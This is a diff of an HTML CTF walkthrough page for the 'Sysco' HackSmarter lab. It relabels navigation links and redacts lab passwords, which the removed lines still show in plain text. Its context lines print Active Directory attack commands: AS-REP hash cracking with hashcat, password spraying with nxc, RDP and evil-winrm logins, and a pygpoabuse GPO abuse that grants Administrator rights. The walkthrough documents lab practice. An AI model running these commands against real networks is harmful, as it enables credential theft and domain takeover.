@@ -10,7 +10,7 @@
   <meta property="og:title" content="Sysco CTF Walkthrough - HackSmarter Labs | Z3rotrace" />
   <meta property="og:description" content="Complete walkthrough covering AS-REP Roasting, Password Spraying, Credential Reuse, and GPO Abuse for privilege escalation on Windows Server 2022 Active Directory." />
   <meta property="og:image" content="https://z3rotrace.live/assets/sysco/bloodhound-gpo-privileges.png" />
-  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/sysco.html" />
+  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/sysco.html" />
   <meta property="og:type" content="article" />
 
   <!-- Twitter Card tags -->
@@ -144,16 +144,16 @@
         </ul>
       </li>
       <li class="has-submenu">
-        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machines Walkthroughs</button>
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
         <ul class="submenu">
-          <li><a href="welcome.html">Welcome - ADCS ESC1</a></li>
-          <li><a href="staged.html">Staged - HackSmarter Labs</a></li>
-          <li><a href="buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
-          <li><a href="arasaka.html">Arasaka - HackSmarter Labs</a></li>
-          <li><a href="midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
-          <li><a href="banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
-          <li><a href="ascension.html">Ascension - HackSmarter Labs</a></li>
-          <li><a href="slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="welcome.html">Welcome</a></li>
+          <li><a href="staged.html">Staged</a></li>
+          <li><a href="buildingmagic.html">BuildingMagic</a></li>
+          <li><a href="arasaka.html">Arasaka</a></li>
+          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
+          <li><a href="banksmarter.html">BankSmarter</a></li>
+          <li><a href="ascension.html">Ascension</a></li>
+          <li><a href="slayer.html">Slayer</a></li>
           <li><a href="anomaly.html">Anomaly</a></li>
           <li><a href="sharethepain.html">ShareThePain</a></li>
           <li><a href="sysco.html" aria-current="page">Sysco</a></li>
@@ -288,10 +288,10 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
   <p>User <code>jack.dowland</code> has pre-authentication disabled. I cracked the hash using hashcat:</p>
   <pre><code>$ hashcat -m 18200 asreproasting_hash /usr/share/wordlists/rockyou.txt</code></pre>
 
-  <pre><code>$krb5asrep$23$jack.dowland@SYSCO.LOCAL:...:musicman1</code></pre>
+  <pre><code>$krb5asrep$23$jack.dowland@SYSCO.LOCAL:...:[REDACTED]</code></pre>
 
   <div class="credential-box">
-    <strong>Credentials obtained:</strong> jack.dowland:musicman1
+    <strong>Credentials obtained:</strong> jack.dowland:[REDACTED]
   </div>
 
   <p>I verified the credentials work:</p>
@@ -302,7 +302,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <h3><span class="step">[Step 5]</span> BloodHound Collection</h3>
   <p>I collected Active Directory data for analysis:</p>
-  <pre><code>$ bloodhound-python -u jack.dowland -p 'musicman1' -d SYSCO.LOCAL -ns 10.0.30.129 -c all</code></pre>
+  <pre><code>$ bloodhound-python -u jack.dowland -p '[REDACTED]' -d SYSCO.LOCAL -ns 10.0.30.129 -c all</code></pre>
 
   <p><img src="../assets/sysco/bloodhound-collection.png" alt="BloodHound data collection output" loading="lazy"></p>
 
@@ -342,7 +342,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <pre><code>$ hashcat -m 500 router_md5_hash --show</code></pre>
 
-  <pre><code>$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1</code></pre>
+  <pre><code>$1$mERr$isugnYiHsjHT.i.tc2GDY.:[REDACTED]</code></pre>
 
   <h3><span class="step">[Step 8]</span> Password Spraying</h3>
 
@@ -354,12 +354,12 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
   </div>
 
   <p>With a new potential password, I sprayed it against domain users and got a hit on <code>lainey.moore</code>:</p>
-  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p 'Chocolate1'</code></pre>
+  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/sysco/password-spray-lainey.png" alt="Password spray revealing valid credentials for lainey.moore" loading="lazy"></p>
 
   <div class="credential-box">
-    <strong>Credentials obtained:</strong> lainey.moore:Chocolate1
+    <strong>Credentials obtained:</strong> lainey.moore:[REDACTED]
   </div>
 
   <h3><span class="step">[Step 9]</span> Enumerating Lainey's Access</h3>
@@ -369,7 +369,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <h3><span class="step">[Step 10]</span> RDP Session and More Credentials</h3>
   <p>I connected via RDP:</p>
-  <pre><code>$ xfreerdp /v:10.0.30.129 /u:lainey.moore /p:'Chocolate1'</code></pre>
+  <pre><code>$ xfreerdp /v:10.0.30.129 /u:lainey.moore /p:'[REDACTED]'</code></pre>
 
   <div class="note">
     <strong>Note:</strong> The original used <code>xfreerdp3</code>, but the standard command is <code>xfreerdp</code>. Also, passwords with special characters should be quoted.
@@ -380,19 +380,19 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
   <p><img src="../assets/sysco/putty-shortcut-credentials.png" alt="PuTTY shortcut revealing hardcoded credentials" loading="lazy"></p>
 
   <p>The shortcut revealed:</p>
-  <pre><code>C:\Users\lainey.moore\Documents\putty.exe -ssh netadmin@10.0.0.1 -pw 5y5coSmarter2025!!!</code></pre>
+  <pre><code>C:\Users\lainey.moore\Documents\putty.exe -ssh netadmin@10.0.0.1 -pw [REDACTED]</code></pre>
 
   <div class="note">
     <strong>Security Note:</strong> Storing passwords in shortcut arguments is a common but dangerous practice. Anyone with access to the desktop can view the full command line, exposing credentials in plaintext.
   </div>
 
   <p>I sprayed this password and discovered it works for <code>greg.shields</code>:</p>
-  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p '5y5coSmarter2025!!!'</code></pre>
+  <pre><code>$ nxc smb 10.0.30.129 -u valid_users.txt -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/sysco/password-spray-greg.png" alt="Password spray revealing greg.shields uses the same password" loading="lazy"></p>
 
   <div class="credential-box">
-    <strong>Credentials obtained:</strong> greg.shields:5y5coSmarter2025!!!
+    <strong>Credentials obtained:</strong> greg.shields:[REDACTED]
   </div>
 
   <h2>Privilege Escalation - GPO Abuse</h2>
@@ -411,7 +411,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
 
   <h3><span class="step">[Step 12]</span> Exploiting the GPO</h3>
   <p>I used pyGPOAbuse to create a scheduled task that adds <code>greg.shields</code> to the local Administrators group:</p>
-  <pre><code>$ python3 pygpoabuse.py 'SYSCO.LOCAL/greg.shields:5y5coSmarter2025!!!' \
+  <pre><code>$ python3 pygpoabuse.py 'SYSCO.LOCAL/greg.shields:[REDACTED]' \
     -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" \
     -command 'net localgroup Administrators greg.shields /add'</code></pre>
 
@@ -425,7 +425,7 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
   <pre><code>[+] ScheduledTask TASK_48cc8916 created!</code></pre>
 
   <p>After waiting for Group Policy to refresh (or forcing it with <code>gpupdate /force</code>), I connected with evil-winrm and confirmed Administrator access:</p>
-  <pre><code>$ evil-winrm -i 10.0.30.129 -u greg.shields -p '5y5coSmarter2025!!!'</code></pre>
+  <pre><code>$ evil-winrm -i 10.0.30.129 -u greg.shields -p '[REDACTED]'</code></pre>
 
   <p><img src="../assets/sysco/administrator-access-confirmed.png" alt="Evil-WinRM session confirming Administrator access" loading="lazy"></p>
 
@@ -456,17 +456,17 @@ LDAP  10.0.30.129  389  DC01  $krb5asrep$23$jack.dowland@SYSCO.LOCAL:d64e9c59...
     <tbody>
       <tr>
         <td><code>jack.dowland</code></td>
-        <td><code>musicman1</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>AS-REP Roasting</td>
       </tr>
       <tr>
         <td><code>lainey.moore</code></td>
-        <td><code>Chocolate1</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>Cisco config crack</td>
       </tr>
       <tr>
         <td><code>greg.shields</code></td>
-        <td><code>5y5coSmarter2025!!!</code></td>
+        <td><code>[REDACTED]</code></td>
         <td>PuTTY shortcut</td>
       </tr>
     </tbody>
